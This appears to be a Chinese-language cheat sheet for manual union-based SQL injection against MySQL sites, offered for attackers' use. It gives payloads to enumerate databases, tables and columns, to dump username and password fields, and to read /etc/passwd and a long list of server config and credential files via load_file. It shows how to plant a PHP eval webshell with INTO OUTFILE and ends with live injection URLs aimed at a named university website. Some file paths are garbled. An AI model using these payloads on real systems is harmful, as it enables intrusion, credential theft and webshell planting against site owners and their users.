暴字段长度<br />
<p>
	<br />
</p>
<p>
	SELECT COUNT(*) AS tp_count FROM `user` WHERE username='wkmz520' OR SLEEP(5) AND 'bNfV'='bNfV&nbsp;
</p>
Order by num/*<br />
<br />
<br />
匹配字段<br />
<br />
and 1=1 union select 1,2,3,4,5…….n/*<br />
<br />
<br />
暴字段位置<br />
<br />
and 1=2 union select 1,2,3,4,5…..n/*<br />
<br />
<br />
利用内置函数暴数据库信息<br />
<br />
version() database() user()<br />
<br />
不用猜解可用字段暴数据库信息(有些网站不适用):<br />
<br />
and 1=2 union all select version() /*<br />
<br />
and 1=2 union all select database() /*<br />
<br />
and 1=2 union all select user() /*<br />
<br />
操作系统信息：<br />
<br />
and 1=2 union all select @@global.version_compile_os from mysql.user /*<br />
<br />
数据库权限：<br />
<br />
and ord(mid(user(),1,1))=114 /* 返回正常说明为root<br />
<br />
<br />
暴库 (mysql&gt;5.0)<br />
<br />
Mysql 5 以上有内置库 information_schema，存储着mysql的所有数据库和表结构信息<br />
<br />
and 1=2 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1<br />
<br />
<br />
猜表<br />
<br />
and 1=2 union select 1,2,3,TABLE_NAME,5,6,7,8,9,10 from information_schema.TABLES where TABLE_SCHEMA=数据库（十六进制） limit 0（开始的记录，0为第一个开始记录）,1（显示1条记录）—<br />
<br />
<br />
猜字段<br />
<br />
and 1=2 Union select 1,2,3,COLUMN_NAME,5,6,7,8,9,10 from information_schema.COLUMNS where TABLE_NAME=表名（十六进制）limit 0,1<br />
<br />
<br />
暴密码<br />
<br />
and 1=2 Union select 1,2,3,用户名段,5,6,7,密码段,8,9 from 表名 limit 0,1<br />
<br />
高级用法（一个可用字段显示两个数据内容）：<br />
<br />
Union select 1,2,3concat(用户名段,0x3c,密码段),5,6,7,8,9 from 表名 limit 0,1<br />
<br />
<br />
直接写马(Root权限)<br />
<br />
条件：1、知道站点物理路径<br />
<br />
2、有足够大的权限（可以用select …. from mysql.user测试）<br />
<br />
3、magic_quotes_gpc()=OFF<br />
<br />
select ‘&lt;?php eval($_POST[cmd])?&gt;' into outfile ‘物理路径'<br />
<br />
and 1=2 union all select 一句话HEX值 into outfile '路径'<br />
<br />
<br />
load_file() 常用路径：<br />
<br />
1、replace(load_file(0×2F6574632F706173737764),0×3c,0×20)<br />
2、replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))<br />
上面两个是查看一个PHP文件里完全显示代码.有些时候不替换一些字符,如 “&lt;” 替换成”空格” 返回的是网页.而无法查看到代码.<br />
3、load_file(char(47)) 可以列出FreeBSD,Sunos系统根目录<br />
4、/etc tpd/conf tpd.conf或/usr/local/apche/conf tpd.conf 查看linux APACHE虚拟主机配置文件<br />
5、c:\Program Files\Apache Group\Apache\conf \httpd.conf 或C:\apache\conf \httpd.conf 查看WINDOWS系统apache文件<br />
6、c:/Resin-3.0.14/conf/resin.conf 查看jsp开发的网站 resin文件配置信息.<br />
7、c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机<br />
8、d:\APACHE\Apache2\conf\httpd.conf<br />
9、C:\Program Files\mysql\my.ini<br />
10、../themes/darkblue_orange/layout.inc.php phpmyadmin 爆路径<br />
11、 c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置文件<br />
12、 /usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看<br />
13、 /usr/local/resin-pro-3.0.22/conf/resin.conf 同上<br />
14 、/usr/local/app/apache2/conf/extra tpd-vhosts.conf APASHE虚拟主机查看<br />
15、 /etc/sysconfig/iptables 本看防火墙策略<br />
16 、usr/local/app/php5 b/php.ini PHP 的相当设置<br />
17 、/etc/my.cnf MYSQL的配置文件<br />
18、 /etc/redhat-release 红帽子的系统版本<br />
19 、C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码<br />
20、/etc/sysconfig/network-scripts/ifcfg-eth0 查看IP.<br />
21、/usr/local/app/php5 b/php.ini //PHP相关设置<br />
22、/usr/local/app/apache2/conf/extra tpd-vhosts.conf //虚拟网站设置<br />
23、C:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini<br />
24、c:\windows\my.ini<br />
25、c:\boot.ini<br />
<br />
网站常用配置文件<br />
<br />
config.inc.php、config.php。load_file（）时要用replace（load_file(HEX)，char(60),char(32)）<br />
<br />
注：<br />
<br />
Char(60)表示 &lt;<br />
<br />
Char(32)表示 空格<br />
<br />
<br />
手工注射时出现的问题：<br />
<br />
当注射后页面显示：<br />
<br />
Illegal mix of collations (latin1_swedish_ci,IMPLICIT) and (utf8_general_ci,IMPLICIT) for operation 'UNION'<br />
<br />
如：http://www.mse.tsinghua.edu.cn/mse/research/instrument.php?ID=13%20and%201=2%20union%20select%201,load_file(0x433A5C626F6F742E696E69),3,4,user()%20<br />
<br />
这是由于前后编码不一致造成的，<br />
<br />
解决方法：在参数前加上 unhex(hex(参数))就可以了。上面的URL就可以改为：<br />
<br />
http://www.mse.tsinghua.edu.cn/mse/research/instrument.php?ID=13%20and%201=2%20union%20select%201,unhex(hex(load_file(0x433A5C626F6F742E696E69))),3,4,unhex(hex(user()))%20<br />
<br />
既可以继续注射了。。。<br />